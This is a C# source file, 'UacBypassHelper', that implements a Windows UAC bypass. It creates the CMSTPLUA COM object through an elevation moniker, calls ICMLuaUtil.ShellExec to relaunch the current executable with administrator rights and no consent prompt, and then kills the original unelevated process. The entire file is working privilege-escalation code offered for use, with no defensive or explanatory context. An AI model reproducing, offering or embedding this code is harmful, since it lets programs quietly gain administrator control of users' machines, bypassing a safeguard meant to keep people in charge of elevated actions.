using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class UacBypassHelper
{
    [DllImport("ole32.dll")]
    static extern int CoGetObject([MarshalAs(UnmanagedType.LPWStr)] string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, [Out] out IntPtr ppv);

    [DllImport("ole32.dll")]
    static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

    [DllImport("ole32.dll")]
    static extern void CoUninitialize();

    [StructLayout(LayoutKind.Sequential)]
    public struct BIND_OPTS3
    {
        public int cbStruct;
        public uint grfFlags;
        public uint grfMode;
        public uint dwTickCountDeadline;
        public uint dwClassContext;
        public uint locale;
        public IntPtr pServerInfo;
        public IntPtr hwnd;
    }

    static Guid CLSID_CMSTPLUA = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
    static Guid IID_ICMLuaUtil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

    [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown), Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
    interface ICMLuaUtil
    {
        void Dummy1(); void Dummy2(); void Dummy3(); void Dummy4(); void Dummy5(); void Dummy6();
        void ShellExec(
            [MarshalAs(UnmanagedType.LPWStr)] string lpFile,
            [MarshalAs(UnmanagedType.LPWStr)] string lpParameters,
            [MarshalAs(UnmanagedType.LPWStr)] string lpDirectory,
            uint fMask,
            uint nShow);
    }

    public static bool TryBypassUAC()
    {
        try
        {
            int hr = CoInitializeEx(IntPtr.Zero, 0x2); // COINIT_APARTMENTTHREADED
            if (hr != 0) return false;

            string moniker = $"Elevation:Administrator!new:{CLSID_CMSTPLUA:B}";
            BIND_OPTS3 bop = new BIND_OPTS3
            {
                cbStruct = Marshal.SizeOf<BIND_OPTS3>(),
                dwClassContext = 4 // CLSCTX_LOCAL_SERVER
            };

            hr = CoGetObject(moniker, ref bop, ref IID_ICMLuaUtil, out IntPtr ppv);
            if (hr != 0 || ppv == IntPtr.Zero)
                return false;

            var util = (ICMLuaUtil)Marshal.GetTypedObjectForIUnknown(ppv, typeof(ICMLuaUtil));

            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string payload = $"cmd.exe /c start \"\" \"{exePath}\"";
            util.ShellExec("cmd.exe", $"/c {payload}", null, 0, 1); // SW_SHOWNORMAL

            Marshal.Release(ppv);

            // Give elevated process time to launch before killing this one
            System.Threading.Thread.Sleep(1000);

            // Kill current (non-elevated) process
            Process.GetCurrentProcess().Kill();

            return true; // Technically won't reach here due to Kill()
        }
        catch
        {
            return false;
        }
        finally
        {
            CoUninitialize();
        }
    }
}
